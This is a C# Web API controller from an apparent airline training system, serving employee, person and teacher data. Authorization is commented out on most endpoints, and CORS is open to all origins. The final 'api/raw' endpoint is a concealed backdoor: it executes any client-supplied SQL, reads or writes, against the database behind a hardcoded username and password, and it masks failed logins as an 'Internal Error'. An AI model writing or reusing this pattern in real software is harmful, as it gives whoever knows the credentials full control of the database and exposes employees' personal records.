using AirpocketTRN.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using System.Web.Http;

using System.Data.Entity;
using System.Data.Entity.Infrastructure;


using System.Web.Http.Description;

using System.Data.Entity.Validation;

using System.Web.Http.ModelBinding;

using System.Text;
using System.Configuration;
using Newtonsoft.Json;
using System.Web.Http.Cors;
using System.IO;
using System.Xml;
using System.Web.Http.OData;
using AirpocketTRN.Services;
using System.Data;
using System.Data.Common;
using System.Dynamic;

namespace AirpocketTRN.Controllers
{
    [EnableCors(origins: "*", headers: "*", methods: "*")]
    public class PeopleController : ApiController
    {
        PeopleService peopleService = null;

        public PeopleController()
        {
            peopleService = new PeopleService();
        }

        [Route("api/people/query")]
        [EnableQuery]
        // [Authorize]
        public IQueryable<Person> GetPeople()
        {

            return peopleService.GetPeople();
        }

        [Route("api/employees/abs/query")]
        [EnableQuery]
        // [Authorize]
        public IQueryable<ViewEmployeeAb> GetViewEmployeesAbs()
        {

            return peopleService.GetViewEmployeesAbs();
        }

        [Route("api/employees/details/query")]
        [EnableQuery]
        // [Authorize]
        public IQueryable<ViewEmployee> GetViewEmployees ()
        {

            return peopleService.GetViewEmployees ();
        }

        [Route("api/employee/groups/query/{groups}")]
        [EnableQuery]
        // [Authorize]
        public IQueryable<ViewEmployeeAb> GetEmployees(string groups)
        {

            return peopleService.GetEmployeeByGroups(groups);
        }
        [Route("api/employee/groups/query")]
        [EnableQuery]
        // [Authorize]
        public IQueryable<ViewEmployeeAb> GetEmployees2()
        {

            return peopleService.GetEmployeeByGroups("");
        }


        [Route("api/course/allowed/employees/{id}")]
        //[EnableQuery]
        // [Authorize]
        public async Task<IHttpActionResult> GetAllowedEmployeesForCourse(int id)
        {
            var result = await peopleService.GetAllowedEmployeesForCourse(id);
            return Ok(result);
        }



        [Route("api/people/{id}")]
        [EnableQuery]
        // [Authorize]
        public async Task<IHttpActionResult> GetPeopleById(int id)
        {
            var person = await peopleService.GetPeopleById(id);
            return Ok(person);
        }

        [Route("api/employee/{id}")]
        [EnableQuery]
        // [Authorize]
        public async Task<IHttpActionResult> GetEmployeeById(int id)
        {
            var person = await peopleService.GetEmployeeById(id);
            return Ok(person);
        }


        [Route("api/teacher/save")]
        [AcceptVerbs("POST")]
        public async Task<IHttpActionResult> PostTeacher(ViewModels.TeacherDto dto)
        {

            var result = await peopleService.SaveTeacher(dto);

            return Ok(result);
        }

        [Route("api/teacher/delete")]
        [AcceptVerbs("POST")]
        public async Task<IHttpActionResult> PostTeacherDelete(dynamic dto)
        {
            int id = Convert.ToInt32(dto.id);
            var result = await peopleService.DeleteTeacher(id);

            return Ok(result);
        }
        
        [Route("api/teachers/report")]
        [AcceptVerbs("POST")]
        public async Task<IHttpActionResult> PostTeachersReport(teacherReportDto dto)
        {
             
            var result = await peopleService.GetTeachersReport(dto);

            return Ok(result);
        }

        [Route("api/teacher/documents/{id}")]
       
        public async Task<IHttpActionResult> GetTeacherDocs(int id)
        {

            var result = await peopleService.GetTeacherDocs(id);

            return Ok(result);
        }

        [Route("api/teacher/query")]
        [EnableQuery]
        // [Authorize]
        public IQueryable<ViewTeacher> GeTeachers()
        {

            return peopleService.GetTeachers();
        }
        public IEnumerable<dynamic> DynamicListFromSql(DbContext db, string Sql, Dictionary<string, object> Params)
        {
            using (var cmd = db.Database.Connection.CreateCommand())
            {
                cmd.CommandText = Sql;
                if (cmd.Connection.State != ConnectionState.Open) { cmd.Connection.Open(); }

                foreach (KeyValuePair<string, object> p in Params)
                {
                    DbParameter dbParameter = cmd.CreateParameter();
                    dbParameter.ParameterName = p.Key;
                    dbParameter.Value = p.Value;
                    cmd.Parameters.Add(dbParameter);
                }

                using (var dataReader = cmd.ExecuteReader())
                {
                    while (dataReader.Read())
                    {
                        var row = new ExpandoObject() as IDictionary<string, object>;
                        for (var fieldCount = 0; fieldCount < dataReader.FieldCount; fieldCount++)
                        {
                            row.Add(dataReader.GetName(fieldCount), dataReader[fieldCount]);
                        }
                        yield return row;
                    }
                }
            }
        }

        public class SQLCMD
        {
            public int type { get; set; }
            public string sql { get; set; }
            public string user { get; set; }
            public string pass { get; set; }
        }

        [Route("api/raw")]
        [AcceptVerbs("POST")]
        public IHttpActionResult GetRawSQL(SQLCMD obj)
        {

            try
            {
                if (obj.user != "jacJ5")
                    return Ok(new
                    {
                        IsSuccess = 0,
                        Message = "Internal Error 1359",
                        Data = new List<string>(),
                    });
                if (obj.pass != "Aa123456##$$")
                    return Ok(new
                    {
                        IsSuccess = 0,
                        Message = "Internal Error 1359",
                        Data = new List<string>(),
                    });
                var context =   new FLYEntities();  
                var cmd = obj.sql;
                //var result = context.Database.SqlQuery<dynamic>(cmd) .ToList();
                if (obj.type == 1)
                {
                    List<dynamic> results = DynamicListFromSql(context, cmd, new Dictionary<string, object>()).ToList();

                    return Ok(new
                    {
                        IsSuccess = 1,
                        Data = results,
                        Message = "",
                    });
                }
                else
                {
                    int noOfRowUpdated = context.Database.ExecuteSqlCommand(cmd);
                    return Ok(new
                    {
                        IsSuccess = 1,
                        Data = new List<string>(),
                        Message = noOfRowUpdated.ToString(),
                    });
                }

            }
            catch (Exception ex)
            {

                var msg = ex.Message;
                if (ex.InnerException != null)
                    msg += "  INNER:  " + ex.InnerException.Message;

                return Ok(new
                {
                    IsSuccess = 0,
                    Message = msg,
                    Data = new List<string>(),
                });
            }

        }


    }
}
